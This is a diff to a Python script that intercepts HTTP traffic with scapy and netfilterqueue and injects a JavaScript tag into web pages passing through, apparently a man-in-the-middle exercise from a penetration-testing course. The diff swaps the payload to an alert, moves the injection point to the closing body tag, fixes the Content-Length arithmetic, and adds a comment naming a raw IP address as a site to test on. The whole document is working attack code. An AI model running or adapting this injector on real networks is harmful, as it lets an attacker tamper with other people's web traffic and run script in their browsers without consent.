@@ -28,16 +28,16 @@ def process_packet(packet):
         elif scapy_packet[scapy.TCP].sport == 80:
             print("[+] Response")
             if "</body>" in str(load):
-                inj_code = "<script>console.log('test')</script>"
+                inj_code = "<script>alert('test')</script>"
                 load = load.replace(
-                    "<script src='js/main.js'></script>", inj_code + " <script src='js/main.js'></script> ")
+                    "</body>", inj_code + "</body>")
                 content_length_search = re.search(
                     "(?:Content-Length:\s)(\d*)", load)
                 if content_length_search:
                     content_length = content_length_search.group(1)
                     print(content_length)
                     new_content_length = int(
-                        content_length) + len(inj_code) + 1000
+                        content_length) + len(inj_code)
 
                     print(load)
                     load = load.replace(
@@ -54,3 +54,8 @@ def process_packet(packet):
 queue = netfilterqueue.NetfilterQueue()
 queue.bind(0, process_packet)
 queue.run()
+
+
+'''
+    you can testing in this site http://54.70.44.50/
+'''
